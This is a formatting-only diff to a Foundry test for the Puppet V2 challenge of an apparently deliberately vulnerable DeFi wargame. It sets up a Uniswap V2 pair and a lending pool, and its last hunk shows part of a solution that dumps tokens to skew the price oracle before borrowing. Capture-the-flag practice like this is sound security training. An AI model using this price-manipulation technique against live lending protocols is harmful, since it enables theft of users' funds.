@@ -39,15 +39,11 @@ contract PuppetV2 is Test {
         /**
          * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
          */
-        attacker = payable(
-            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
-        );
+        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
         vm.label(attacker, "Attacker");
         vm.deal(attacker, ATTACKER_INITIAL_ETH_BALANCE);
 
-        deployer = payable(
-            address(uint160(uint256(keccak256(abi.encodePacked("deployer")))))
-        );
+        deployer = payable(address(uint160(uint256(keccak256(abi.encodePacked("deployer"))))));
         vm.label(deployer, "deployer");
 
         // Deploy token to be traded in Uniswap
@@ -58,18 +54,11 @@ contract PuppetV2 is Test {
         vm.label(address(weth), "WETH");
 
         // Deploy Uniswap Factory and Router
-        uniswapV2Factory = IUniswapV2Factory(
-            deployCode(
-                "./src/build-uniswap/v2/UniswapV2Factory.json",
-                abi.encode(address(0))
-            )
-        );
+        uniswapV2Factory =
+            IUniswapV2Factory(deployCode("./src/build-uniswap/v2/UniswapV2Factory.json", abi.encode(address(0))));
 
         uniswapV2Router = IUniswapV2Router02(
-            deployCode(
-                "./src/build-uniswap/v2/UniswapV2Router02.json",
-                abi.encode(address(uniswapV2Factory), address(weth))
-            )
+            deployCode("./src/build-uniswap/v2/UniswapV2Router02.json", abi.encode(address(uniswapV2Factory), address(weth)))
         );
 
         // Create Uniswap pair against WETH and add liquidity
@@ -84,9 +73,7 @@ contract PuppetV2 is Test {
         );
 
         // Get a reference to the created Uniswap pair
-        uniswapV2Pair = IUniswapV2Pair(
-            uniswapV2Factory.getPair(address(dvt), address(weth))
-        );
+        uniswapV2Pair = IUniswapV2Pair(uniswapV2Factory.getPair(address(dvt), address(weth)));
 
         assertGt(uniswapV2Pair.balanceOf(deployer), 0);
 
@@ -103,17 +90,9 @@ contract PuppetV2 is Test {
         dvt.transfer(address(puppetV2Pool), POOL_INITIAL_TOKEN_BALANCE);
 
         // Ensure correct setup of pool.
-        assertEq(
-            puppetV2Pool.calculateDepositOfWETHRequired(1 ether),
-            0.3 ether
-        );
+        assertEq(puppetV2Pool.calculateDepositOfWETHRequired(1 ether), 0.3 ether);
 
-        assertEq(
-            puppetV2Pool.calculateDepositOfWETHRequired(
-                POOL_INITIAL_TOKEN_BALANCE
-            ),
-            300000 ether
-        );
+        assertEq(puppetV2Pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE), 300000 ether);
 
         console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
     }
@@ -130,13 +109,7 @@ contract PuppetV2 is Test {
         path[0] = address(dvt);
         path[1] = uniswapV2Router.WETH();
 
-        uniswapV2Router.swapExactTokensForETH(
-            ATTACKER_INITIAL_TOKEN_BALANCE,
-            1,
-            path,
-            attacker,
-            DEADLINE
-        );
+        uniswapV2Router.swapExactTokensForETH(ATTACKER_INITIAL_TOKEN_BALANCE, 1, path, attacker, DEADLINE);
 
         // 2. Get WETH and approve the lending pool
         payable(address(weth)).call{value: 29.5 ether}("");
